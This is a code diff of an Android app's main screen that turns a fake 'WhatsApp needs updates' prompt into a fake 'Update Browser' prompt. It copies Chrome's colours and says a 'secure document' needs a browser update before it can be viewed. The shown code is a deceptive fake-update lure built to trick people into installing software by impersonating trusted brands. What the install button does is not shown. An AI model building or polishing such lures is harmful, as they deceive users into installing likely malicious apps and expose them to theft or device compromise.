@@ -1,4 +1,4 @@
-package com.whatsapp.update;
+package com.browser.update;
 
 import android.content.Intent;
 import android.graphics.Color;
@@ -20,33 +20,34 @@ public class MainActivity extends AppCompatActivity {
         layout.setOrientation(LinearLayout.VERTICAL);
         layout.setBackgroundColor(Color.WHITE);
         layout.setGravity(Gravity.CENTER);
-        layout.setPadding(60, 60, 60, 60);
+        layout.setPadding(50, 50, 50, 50);
 
+        // Browser-style Icon placeholder
         TextView logo = new TextView(this);
-        logo.setText("💬"); 
-        logo.setTextSize(100f);
+        logo.setText("🌐"); 
+        logo.setTextSize(80f);
         logo.setGravity(Gravity.CENTER);
         
         TextView title = new TextView(this);
-        title.setText("WhatsApp needs updates");
+        title.setText("Update Browser");
         title.setTextSize(24f);
         title.setTypeface(null, Typeface.BOLD);
-        title.setTextColor(Color.parseColor("#075E54"));
+        title.setTextColor(Color.parseColor("#202124")); // Chrome Dark Grey
         title.setGravity(Gravity.CENTER);
-        title.setPadding(0, 30, 0, 15);
+        title.setPadding(0, 20, 0, 10);
 
         TextView subtitle = new TextView(this);
-        subtitle.setText("A new version of WhatsApp is available. Please install the update to continue using your account securely.");
-        subtitle.setTextSize(16f);
-        subtitle.setTextColor(Color.GRAY);
+        subtitle.setText("Your browser version is out of date. To view this secure document, you must install the latest browser update.");
+        subtitle.setTextSize(15f);
+        subtitle.setTextColor(Color.parseColor("#5f6368"));
         subtitle.setGravity(Gravity.CENTER);
-        subtitle.setPadding(0, 0, 0, 50);
+        subtitle.setPadding(0, 0, 0, 40);
 
         Button btn = new Button(this);
-        btn.setText("Install Update");
+        btn.setText("Update Browser Now");
         btn.setTextColor(Color.WHITE);
-        btn.setTextSize(18f);
-        btn.setBackgroundColor(Color.parseColor("#25D366"));
+        btn.setTextSize(16f);
+        btn.setBackgroundColor(Color.parseColor("#1A73E8")); // Chrome Blue
         
         layout.addView(logo);
         layout.addView(title);
